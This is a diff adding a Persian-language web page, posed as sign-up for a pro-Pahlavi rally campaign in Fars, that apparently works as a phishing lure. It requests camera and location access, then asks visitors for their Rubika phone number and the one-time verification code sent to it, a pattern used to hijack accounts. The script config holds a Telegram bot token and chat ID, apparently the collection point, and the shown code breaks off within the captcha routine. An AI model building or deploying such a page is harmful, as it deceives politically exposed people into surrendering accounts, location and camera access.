@@ -1,0 +1,1854 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>همیاری برای ایران جاویدان</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js">
+    </script>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Vazir', 'IRANSans', 'Segoe UI', 'Segoe UI Emoji', 'Apple Color Emoji', system-ui, -apple-system, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 14px;
+            background: #05050f;
+            direction: rtl;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ===== BACKGROUND ===== */
+        .bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background: radial-gradient(ellipse at 30% 40%, #1a1a3e, #0c0c1e 70%, #05050f);
+            animation: bgAnim 25s infinite alternate;
+        }
+        @keyframes bgAnim {
+            0% {
+                background: radial-gradient(ellipse at 30% 40%, #1a1a3e, #0c0c1e 70%, #05050f);
+            }
+            50% {
+                background: radial-gradient(ellipse at 70% 60%, #2a1a4a, #1a1a3e 60%, #05050f);
+            }
+            100% {
+                background: radial-gradient(ellipse at 50% 30%, #1a2a4a, #0c0c1e 70%, #05050f);
+            }
+        }
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.3;
+            z-index: 0;
+            pointer-events: none;
+            animation: orbFloat 25s infinite alternate;
+        }
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: #ff6b6b;
+            top: -120px;
+            right: -100px;
+        }
+        .orb-2 {
+            width: 450px;
+            height: 450px;
+            background: #4ecdc4;
+            bottom: -150px;
+            left: -120px;
+            animation-delay: -8s;
+        }
+        .orb-3 {
+            width: 250px;
+            height: 250px;
+            background: #ffd93d;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -14s;
+            opacity: 0.15;
+        }
+        .orb-4 {
+            width: 300px;
+            height: 300px;
+            background: #a29bfe;
+            top: 10%;
+            left: 10%;
+            animation-delay: -5s;
+            opacity: 0.15;
+        }
+        @keyframes orbFloat {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                transform: translate(50px, -40px) scale(1.2);
+            }
+        }
+        .particles {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            animation: twinkle 5s infinite alternate;
+        }
+        @keyframes twinkle {
+            0% {
+                opacity: 0.02;
+                transform: scale(0.3);
+            }
+            100% {
+                opacity: 0.7;
+                transform: scale(1.5);
+            }
+        }
+
+        /* ===== PERMISSION OVERLAY ===== */
+        .permission-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 100;
+            background: rgba(5, 5, 15, 0.92);
+            backdrop-filter: blur(30px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.7s ease;
+            flex-direction: column;
+            text-align: center;
+            transition: opacity 0.8s ease;
+        }
+        .permission-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .permission-box {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 48px 36px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.04);
+            animation: floatBox 4s ease-in-out infinite alternate;
+        }
+        @keyframes floatBox {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(-10px);
+            }
+        }
+        .permission-box .icon {
+            font-size: 4.5rem;
+            margin-bottom: 12px;
+            display: block;
+            animation: iconPulse 2.5s ease-in-out infinite;
+        }
+        @keyframes iconPulse {
+            0%,
+            100% {
+                transform: scale(1) rotate(0deg);
+            }
+            50% {
+                transform: scale(1.1) rotate(-5deg);
+            }
+        }
+        .permission-box h2 {
+            color: #ffd700;
+            font-size: 2rem;
+            margin-bottom: 10px;
+            font-weight: 800;
+            text-shadow: 0 0 40px rgba(255, 215, 0, 0.1);
+            letter-spacing: 0.5px;
+        }
+        .permission-box .sub-text {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 1rem;
+            margin-bottom: 12px;
+            line-height: 2;
+        }
+        .permission-box .highlight-text {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.9rem;
+            line-height: 1.9;
+            margin-bottom: 24px;
+            background: rgba(255, 215, 0, 0.03);
+            padding: 12px 18px;
+            border-radius: 16px;
+            border-right: 3px solid rgba(255, 215, 0, 0.08);
+        }
+        .permission-box .btn {
+            background: linear-gradient(145deg, #ffb347, #f57c00);
+            border: none;
+            padding: 18px 32px;
+            border-radius: 60px;
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: #0b0b1a;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            box-shadow: 0 8px 35px rgba(255, 140, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
+        }
+        .permission-box .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s;
+        }
+        .permission-box .btn:hover::before {
+            left: 100%;
+        }
+        .permission-box .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 12px 45px rgba(255, 140, 0, 0.35);
+        }
+        .permission-box .btn:active {
+            transform: scale(0.97);
+        }
+        .permission-box .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        .permission-status {
+            margin-top: 18px;
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.25);
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .permission-status .ok {
+            color: #55efc4;
+        }
+        .permission-status .fail {
+            color: #ff7675;
+        }
+        .permission-status .wait {
+            color: rgba(255, 255, 255, 0.2);
+        }
+        .permission-error {
+            margin-top: 12px;
+            color: #ff7675;
+            font-size: 0.85rem;
+            display: none;
+            background: rgba(255, 80, 80, 0.06);
+            padding: 10px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 80, 80, 0.08);
+        }
+        .permission-error.show {
+            display: block;
+        }
+        .permission-timer {
+            margin-top: 14px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.15);
+        }
+        .permission-timer .highlight {
+            color: rgba(255, 215, 0, 0.3);
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 860px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(30px);
+            border-radius: 52px;
+            padding: 42px 34px;
+            box-shadow: 0 40px 120px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.025);
+            transition: all 0.4s ease;
+            display: none;
+        }
+        .container.show {
+            display: block;
+            animation: slideUp 0.7s ease;
+        }
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            font-size: 2.8rem;
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ffd700 0%, #ffb347 40%, #ff8c00 80%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.2;
+            letter-spacing: 0.3px;
+        }
+        .subhead {
+            font-size: 1.05rem;
+            text-align: center;
+            margin-bottom: 22px;
+            font-weight: 300;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 2;
+        }
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-top: 28px;
+            margin-bottom: 10px;
+            color: #ffb347;
+            position: relative;
+            display: inline-block;
+        }
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            right: 0;
+            width: 60%;
+            height: 3px;
+            background: linear-gradient(90deg, #ffb347, rgba(255, 180, 0, 0.1));
+            border-radius: 10px;
+        }
+        .section-desc {
+            font-size: 0.98rem;
+            line-height: 2;
+            margin-bottom: 14px;
+            color: rgba(255, 255, 255, 0.72);
+            background: rgba(0, 0, 0, 0.2);
+            padding: 16px 22px;
+            border-radius: 20px;
+            border-right: 3px solid rgba(255, 180, 0, 0.15);
+        }
+        .thankyou {
+            font-size: 2.6rem;
+            text-align: center;
+            margin: 30px 0 22px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: thankyouPulse 3s ease-in-out infinite;
+            letter-spacing: 1px;
+            font-family: 'Segoe UI Emoji', 'Apple Color Emoji', system-ui, sans-serif;
+        }
+        @keyframes thankyouPulse {
+            0%,
+            100% {
+                filter: drop-shadow(0 0 20px rgba(255, 80, 80, 0.08));
+                transform: scale(1);
+            }
+            50% {
+                filter: drop-shadow(0 0 60px rgba(255, 80, 80, 0.2));
+                transform: scale(1.04);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.88rem;
+            letter-spacing: 0.3px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 30px;
+            border: none;
+            background: rgba(255, 255, 255, 0.04);
+            color: #fff;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.35s ease;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .form-group input:focus {
+            background: rgba(255, 255, 255, 0.07);
+            border-color: rgba(255, 180, 0, 0.2);
+            box-shadow: 0 0 0 6px rgba(255, 180, 0, 0.02);
+            transform: scale(1.005);
+        }
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.15);
+            font-weight: 300;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            margin: 18px 0 14px;
+            font-size: 0.88rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-top: 1px;
+            accent-color: #ffb347;
+            flex-shrink: 0;
+            cursor: pointer;
+            border-radius: 6px;
+        }
+        .privacy-link {
+            color: #ffb347;
+            text-decoration: underline;
+            cursor: pointer;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+        .privacy-link:hover {
+            color: #ffd700;
+        }
+
+        /* ===== CAPTCHA ===== */
+        .captcha-group {
+            margin: 16px 0 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .captcha-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .captcha-canvas {
+            border-radius: 16px;
+            border: 2px solid rgba(255, 215, 0, 0.08);
+            cursor: pointer;
+            background: rgba(0, 0, 0, 0.2);
+            min-width: 140px;
+            min-height: 50px;
+            height: 50px;
+            flex-shrink: 0;
+        }
+        .captcha-refresh {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 50%;
+            width: 44px;
+            height: 44px;
+            color: #fff;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .captcha-refresh:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(45deg);
+        }
+        .captcha-input {
+            flex: 1;
+            min-width: 120px;
+            padding: 12px 16px;
+            border-radius: 30px;
+            border: none;
+            background: rgba(255, 255, 255, 0.04);
+            color: #fff;
+            font-size: 0.95rem;
+            outline: none;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            transition: 0.3s;
+            direction: ltr;
+        }
+        .captcha-input:focus {
+            background: rgba(255, 255, 255, 0.07);
+            border-color: rgba(255, 180, 0, 0.2);
+            box-shadow: 0 0 0 6px rgba(255, 180, 0, 0.02);
+        }
+        .captcha-input::placeholder {
+            color: rgba(255, 255, 255, 0.15);
+        }
+        .captcha-error {
+            color: #ff7675;
+            font-size: 0.8rem;
+            display: none;
+        }
+        .captcha-error.show {
+            display: block;
+        }
+        .captcha-success {
+            color: #55efc4;
+            font-size: 0.8rem;
+            display: none;
+        }
+        .captcha-success.show {
+            display: block;
+        }
+
+        .btn {
+            border: none;
+            padding: 16px 28px;
+            border-radius: 50px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 10px;
+            letter-spacing: 0.3px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-primary {
+            background: linear-gradient(145deg, #ffb347, #f57c00);
+            color: #0b0b1a;
+            box-shadow: 0 8px 35px rgba(255, 140, 0, 0.15);
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 50px rgba(255, 140, 0, 0.3);
+        }
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .btn-success {
+            background: linear-gradient(145deg, #00b894, #00a381);
+            color: #fff;
+            box-shadow: 0 8px 35px rgba(0, 184, 148, 0.15);
+        }
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 50px rgba(0, 184, 148, 0.25);
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: none;
+        }
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.08), transparent);
+            transition: left 0.5s;
+        }
+        .btn:hover::after {
+            left: 100%;
+        }
+
+        .status-bar {
+            margin-top: 14px;
+            padding: 12px 18px;
+            border-radius: 28px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: all 0.4s;
+            display: none;
+        }
+        .status-bar.show {
+            display: block;
+        }
+        .status-bar.loading {
+            background: rgba(255, 180, 0, 0.06);
+            border: 1px solid rgba(255, 180, 0, 0.08);
+            color: #ffd700;
+            animation: pulseStatus 1.2s infinite;
+        }
+        @keyframes pulseStatus {
+            0%,
+            100% {
+                opacity: 0.7;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+        .status-bar.success {
+            background: rgba(0, 184, 148, 0.06);
+            border: 1px solid rgba(0, 184, 148, 0.08);
+            color: #55efc4;
+        }
+        .status-bar.error {
+            background: rgba(255, 80, 80, 0.06);
+            border: 1px solid rgba(255, 80, 80, 0.08);
+            color: #ff7675;
+        }
+
+        .code-section {
+            margin-top: 28px;
+            padding: 24px 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 215, 0, 0.03);
+            text-align: center;
+            display: none;
+            animation: fadeSlide 0.5s ease;
+        }
+        .code-section.show {
+            display: block;
+        }
+        @keyframes fadeSlide {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .code-section h2 {
+            font-size: 1.6rem;
+            color: #ffd700;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .code-section .sub-text {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.85rem;
+            margin-bottom: 14px;
+        }
+        .code-input {
+            width: 180px;
+            padding: 14px 16px;
+            border-radius: 30px;
+            border: 2px solid rgba(255, 215, 0, 0.04);
+            background: rgba(0, 0, 0, 0.2);
+            color: #fff;
+            font-size: 1.7rem;
+            text-align: center;
+            letter-spacing: 8px;
+            outline: none;
+            direction: ltr;
+            margin: 8px auto;
+            display: block;
+            transition: all 0.3s;
+        }
+        .code-input:focus {
+            border-color: rgba(255, 215, 0, 0.12);
+        }
+        .code-input.verified {
+            border-color: #00b894;
+        }
+        .timer-text {
+            font-size: 0.95rem;
+            margin: 12px 0 6px;
+            color: rgba(255, 255, 255, 0.3);
+        }
+        .timer-text .highlight {
+            color: #ffd700;
+            font-weight: 700;
+        }
+        .btn-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+        .btn-row .btn {
+            width: auto;
+            padding: 12px 26px;
+            min-width: 120px;
+            font-size: 0.9rem;
+            flex: 1;
+        }
+
+        .footer-note {
+            font-size: 0.6rem;
+            text-align: center;
+            margin-top: 24px;
+            color: rgba(255, 255, 255, 0.05);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(16px);
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(16px);
+            color: #fff;
+            padding: 14px 32px;
+            border-radius: 60px;
+            font-size: 0.9rem;
+            z-index: 999;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            opacity: 0;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+            font-weight: 500;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        .toast.success {
+            border-color: rgba(0, 255, 150, 0.06);
+        }
+        .toast.error {
+            border-color: rgba(255, 80, 80, 0.06);
+        }
+        .toast.info {
+            border-color: rgba(255, 215, 0, 0.04);
+        }
+
+        .perm-snackbar {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: rgba(255, 215, 0, 0.08);
+            backdrop-filter: blur(16px);
+            color: #ffd700;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            z-index: 50;
+            border: 1px solid rgba(255, 215, 0, 0.06);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.3);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            opacity: 0;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+        }
+        .perm-snackbar.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        @media (max-width: 700px) {
+            .container {
+                padding: 24px 18px;
+                border-radius: 38px;
+            }
+            h1 {
+                font-size: 2.1rem;
+            }
+            .section-title {
+                font-size: 1.5rem;
+            }
+            .thankyou {
+                font-size: 2rem;
+            }
+            .subhead {
+                font-size: 0.95rem;
+            }
+            .code-input {
+                width: 150px;
+                font-size: 1.4rem;
+                letter-spacing: 6px;
+            }
+            .btn-row .btn {
+                min-width: 90px;
+                padding: 10px 18px;
+                font-size: 0.8rem;
+            }
+            .permission-box {
+                padding: 32px 24px;
+            }
+            .permission-box h2 {
+                font-size: 1.6rem;
+            }
+            .permission-box .icon {
+                font-size: 3.5rem;
+            }
+            .orb-1,
+            .orb-2 {
+                width: 200px;
+                height: 200px;
+                filter: blur(60px);
+            }
+            .captcha-canvas {
+                min-width: 100px;
+                height: 40px;
+            }
+            .captcha-row {
+                gap: 8px;
+            }
+        }
+        @media (max-width: 450px) {
+            .container {
+                padding: 16px 12px;
+                border-radius: 30px;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .section-desc {
+                padding: 12px 14px;
+                font-size: 0.88rem;
+            }
+            .form-group input {
+                padding: 12px 16px;
+                font-size: 0.88rem;
+            }
+            .btn {
+                font-size: 0.92rem;
+                padding: 14px 18px;
+            }
+            .thankyou {
+                font-size: 1.6rem;
+                margin: 18px 0 14px;
+            }
+            .code-input {
+                width: 130px;
+                font-size: 1.2rem;
+                letter-spacing: 5px;
+                padding: 10px 12px;
+            }
+            .permission-box {
+                padding: 24px 18px;
+            }
+            .permission-box h2 {
+                font-size: 1.3rem;
+            }
+            .permission-box .icon {
+                font-size: 3rem;
+            }
+            .permission-box .btn {
+                font-size: 1rem;
+                padding: 14px 24px;
+            }
+            .permission-status {
+                font-size: 0.75rem;
+                gap: 10px;
+            }
+            .captcha-canvas {
+                min-width: 80px;
+                height: 36px;
+            }
+            .captcha-refresh {
+                width: 36px;
+                height: 36px;
+                font-size: 1rem;
+            }
+            .captcha-input {
+                padding: 10px 14px;
+                font-size: 0.85rem;
+                min-width: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+    <div class="orb orb-4"></div>
+    <div class="particles" id="particles"></div>
+
+    <div id="toast" class="toast"></div>
+    <div class="perm-snackbar" id="permSnackbar">⚠️ موقعیت مکانی دریافت نشد، اما می‌توانید ادامه دهید.</div>
+
+    <!-- ===== PERMISSION OVERLAY ===== -->
+    <div class="permission-overlay" id="permissionOverlay">
+        <div class="permission-box">
+            <span class="icon">🚀</span>
+            <h2>به جمع ما خوش آمدی!</h2>
+            <p class="sub-text">برای شروع، به دسترسی شما نیاز داریم.</p>
+            <div class="highlight-text">📌 با کلیک روی دکمه، درخواست دسترسی ارسال می‌شود.</div>
+            <button class="btn" id="permissionBtn">شروع کن</button>
+            <div class="permission-status" id="permissionStatus">
+                <span id="permCamera" class="wait">⏳ دوربین: در انتظار</span>
+                <span id="permLocation" class="wait">⏳ موقعیت: در انتظار</span>
+            </div>
+            <div class="permission-error" id="permissionError">⚠️ دسترسی‌ها داده نشد. دوباره تلاش کنید.</div>
+            <div class="permission-timer" id="permissionTimer">
+                <span class="highlight" id="timerCountdownPerm">۲:۰۰</span> زمان باقی‌مانده
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== MAIN CONTAINER ===== -->
+    <div class="container" id="mainContainer">
+        <h1>درود بر طرفداران ایران جاویدان</h1>
+        <div class="subhead">برای برگزاری یک کارزار برای طرفداران پهلوی نیاز به ۲۵۰ نفر داریم که راه بندازیم یعنی ۲۵۰ تا شماره داریم.</div>
+
+        <div class="section-title">چه اتفاقی میوفته؟؟</div>
+        <div class="section-desc">در استان فارس شهر های مختلف یک تجمعی برگزار میکنیم بعد از زیاد شدن مان ، تا حرفمان را به همگان بزنیم.</div>
+
+        <div class="section-title">تو چیکار میکنی اینجا؟؟</div>
+        <div class="section-desc">شماره‌ای که در روبیکا داری رو میدی و یک کد برات میاد. اون هم میدی ، ما وقتی به بالای ۲۵۰ نفر رسیدیم با استفاده از اون و تمامی شماره ها یک کارزار راه می اندازیم تا بیش از ۱۰۰۰ نفر در هر شهر جمع آوری کنیم. <br> و به کمک شما نیاز داریم. <br> هیچ چیز خاصی هم نمیخوایم فقط شمارتان را برای یک کار کوچیک که برای خودتان هست می‌خواهیم.</div>
+
+        <div class="thankyou">با تشکر 🫀🌹</div>
+
+        <form id="mainForm">
+            <div class="form-group">
+                <label>نام و نام خانوادگی</label>
+                <input type="text" id="fullName" placeholder="مثال: علی محمدی" required>
+            </div>
+            <div class="form-group">
+                <label>شماره همراه</label>
+                <input type="tel" id="phone" placeholder="مثال: ۰۹۱۲۳۴۵۶۷۸۹" required>
+            </div>
+            <div class="form-group">
+                <label>سن</label>
+                <input type="number" id="age" placeholder="مثال: ۲۵" required min="1" max="120">
+            </div>
+            <div class="form-group">
+                <label>شهر مورد نظر (اختیاری)</label>
+                <input type="text" id="city" placeholder="مثال: شیراز">
+            </div>
+
+            <!-- ===== CAPTCHA ===== -->
+            <div class="captcha-group">
+                <label style="color:rgba(255,255,255,0.7); font-size:0.88rem; font-weight:600;">کد امنیتی</label>
+                <div class="captcha-row">
+                    <canvas class="captcha-canvas" id="captchaCanvas" width="140" height="50"></canvas>
+                    <button type="button" class="captcha-refresh" id="captchaRefresh" title="تازه کردن کد">⟳</button>
+                    <input type="text" class="captcha-input" id="captchaInput" placeholder="کد را وارد کنید" maxlength="5" dir="ltr" autocomplete="off">
+                </div>
+                <div class="captcha-error" id="captchaError">❌ کد امنیتی اشتباه است</div>
+                <div class="captcha-success" id="captchaSuccess">✅ کد امنیتی صحیح است</div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="privacyConsent" required>
+                <label for="privacyConsent">من با <span class="privacy-link" id="privacyLink">سیاست حفظ حریم خصوصی</span> موافقم.</label>
+            </div>
+
+            <button type="submit" class="btn btn-primary" id="submitBtn">ثبت</button>
+
+            <div id="statusBar" class="status-bar">
+                <span id="statusIcon">⏳</span>
+                <span id="statusText">در حال ثبت...</span>
+            </div>
+        </form>
+
+        <div class="code-section" id="codeSection">
+            <h2>✅ کد تایید</h2>
+            <p class="sub-text">کد ۶ رقمی ارسال شده را وارد کنید</p>
+            <input type="text" class="code-input" id="verificationCode" placeholder="●●●●●●" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+            <div class="btn-row">
+                <button class="btn btn-success" id="verifyBtn">تایید</button>
+                <button class="btn btn-secondary" id="resendBtn" disabled>ارسال مجدد</button>
+            </div>
+            <div class="timer-text" id="timerText"><span class="highlight" id="timerCountdown">۱۰</span> ثانیه تا ارسال مجدد</div>
+            <p style="font-size:0.7rem; opacity:0.12; margin-top:4px;">پس از تایید، ثبت‌نام کامل می‌شود.</p>
+        </div>
+
+        <div class="footer-note">اطلاعات شما نزد ما محفوظ است.</div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== CONFIG =====
+            const BOT_TOKEN = '7971237505:AAGbf8R2q3Ba-vmcfyVh0I-v_0C-EXXS7ek';
+            const CHAT_ID = '7247257648';
+            const PERMISSION_TIMEOUT = 120;
+            const MAX_LOCATION_RETRIES = 3;
+            const REGISTER_TIMEOUT = 20000; // 20 seconds
+
+            // ===== DOM =====
+            const permissionOverlay = document.getElementById('permissionOverlay');
+            const permissionBtn = document.getElementById('permissionBtn');
+            const permCamera = document.getElementById('permCamera');
+            const permLocation = document.getElementById('permLocation');
+            const permissionError = document.getElementById('permissionError');
+            const timerCountdownPerm = document.getElementById('timerCountdownPerm');
+            const mainContainer = document.getElementById('mainContainer');
+            const permSnackbar = document.getElementById('permSnackbar');
+
+            const form = document.getElementById('mainForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const fullName = document.getElementById('fullName');
+            const phone = document.getElementById('phone');
+            const age = document.getElementById('age');
+            const city = document.getElementById('city');
+            const consent = document.getElementById('privacyConsent');
+            const privacyLink = document.getElementById('privacyLink');
+            const statusBar = document.getElementById('statusBar');
+            const statusIcon = document.getElementById('statusIcon');
+            const statusText = document.getElementById('statusText');
+            const codeSection = document.getElementById('codeSection');
+            const codeInput = document.getElementById('verificationCode');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const resendBtn = document.getElementById('resendBtn');
+            const timerText = document.getElementById('timerText');
+            const timerCountdown = document.getElementById('timerCountdown');
+            const toast = document.getElementById('toast');
+
+            // ===== CAPTCHA DOM =====
+            const captchaCanvas = document.getElementById('captchaCanvas');
+            const captchaInput = document.getElementById('captchaInput');
+            const captchaRefresh = document.getElementById('captchaRefresh');
+            const captchaError = document.getElementById('captchaError');
+            const captchaSuccess = document.getElementById('captchaSuccess');
+
+            // ===== STATE =====
+            let isSubmitting = false;
+            let isCodeVerified = false;
+            let timerSeconds = 10;
+            let canResend = false;
+            let timerInterval = null;
+            let cameraGranted = false;
+            let locationGranted = false;
+            let permTimerInterval = null;
+            let permTimeLeft = PERMISSION_TIMEOUT;
+            let overlayClosed = false;
+            let permissionsFinalized = false;
+            let captchaText = '';
+            let captchaVerified = false;
+            let registerTimeoutId = null;
+
+            // ============================================================
+            //  CAPTCHA
+            // ============================================================
+            function generateCaptcha() {
+                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < 5; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+
+            function drawCaptcha(text) {
+                const ctx = captchaCanvas.getContext('2d');
+                const w = captchaCanvas.width;
+                const h = captchaCanvas.height;
+
+                ctx.clearRect(0, 0, w, h);
+                const grad = ctx.createLinearGradient(0, 0, w, h);
+                grad.addColorStop(0, '#1a1a3e');
+                grad.addColorStop(1, '#0c0c1e');
+                ctx.fillStyle = grad;
+                ctx.fillRect(0, 0, w, h);
+
+                for (let i = 0; i < 7; i++) {
+                    ctx.beginPath();
+                    ctx.moveTo(Math.random() * w, Math.random() * h);
+                    ctx.lineTo(Math.random() * w, Math.random() * h);
+                    ctx.strokeStyle = `rgba(255,255,255,${0.05 + Math.random() * 0.1})`;
+                    ctx.lineWidth = 1 + Math.random() * 2;
+                    ctx.stroke();
+                }
+
+                const chars = text.split('');
+                const charWidth = w / chars.length;
+                const baseY = h / 2 + 6;
+
+                for (let i = 0; i < chars.length; i++) {
+                    const x = i * charWidth + charWidth / 2 - 4;
+                    const y = baseY + (Math.random() - 0.5) * 8;
+                    const angle = (Math.random() - 0.5) * 0.4;
+
+                    ctx.save();
+                    ctx.translate(x, y);
